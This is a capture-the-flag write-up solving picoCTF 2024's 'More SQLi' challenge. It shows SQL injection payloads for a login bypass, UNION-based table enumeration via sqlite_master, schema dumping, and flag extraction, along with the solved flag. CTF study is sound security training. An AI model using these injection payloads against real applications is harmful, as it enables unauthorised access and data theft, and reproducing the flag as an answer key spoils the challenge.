# picoCTF 2024 – More SQLi Write-up

**Challenge:** More SQLi  
**Author:** Mubarak Mikail  
**Category:** Web Exploitation   
**URL:** http://saturn.picoctf.net:57682/  



## 🧠 Description

Can you find the flag on this website?  
Try to find the flag at the given URL.

---
## 🚩 Solution
---

## 🛠 Step 0 :) Bypass the login
### Using classic SQL injection on the login form:
```sqlite
Username: admin  
Password: ' OR 1=1 -- -
```
---

### 🔍 Step 1: Test for SQL Injection

Use a classic SQLi payload in the search field to test:

```
' UNION SELECT 1,2,3-- -
```

✅ If successful, the page displays `1`, `2`, and `3` — confirming that:
- SQLi is possible
- The query uses 3 columns

---

### 📂 Step 2: List Table Names from `sqlite_master`

Since this is SQLite, use the internal metadata table:

```
' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'-- -
```

✅ Output:

```
users,offices,hints,more_table
```

---

### 🧱 Step 3: Dump Schema of `more_table`

We suspect the flag is in `more_table`. Check its schema:

```
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='more_table'-- -
```

✅ Output:

```
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
```

Now we know there's a `flag` column.

---

### 🏁 Step 4: Extract the Flag

Final payload to extract the flag:

```
' UNION SELECT 1,flag,3 FROM more_table-- -
```

✅ Output:

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
```

---

## ✅ Final Flag

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
```

---

## 📝 Summary

- SQLite backend with UNION-based SQL injection
- Used `sqlite_master` to list tables and extract schema
- Retrieved the flag from `more_table.flag`
